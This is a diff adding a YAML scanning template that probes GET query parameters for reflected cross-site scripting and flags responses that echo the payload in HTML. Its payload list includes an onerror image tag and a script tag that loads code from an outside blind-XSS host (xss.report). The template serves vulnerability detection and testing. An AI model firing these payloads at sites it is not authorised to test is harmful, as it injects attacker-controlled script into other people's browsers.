@@ -1,0 +1,32 @@
+info:
+  name: Basic Reflection Potential XSS Detection
+  author: pdteam
+  severity: low
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+    payloads:
+      reflection:
+        - "<img/src/onerror=print()>"
+        - "\"><img/src/onerror=print()>"
+        - "ya3raj<b>hahaha"
+        - "\"><script src=https://xss.report/c/ya3raj></script>"
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{url_encode(reflection)}}"
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+      - type: word
+        part: header
+        words:
+          - "text/html"
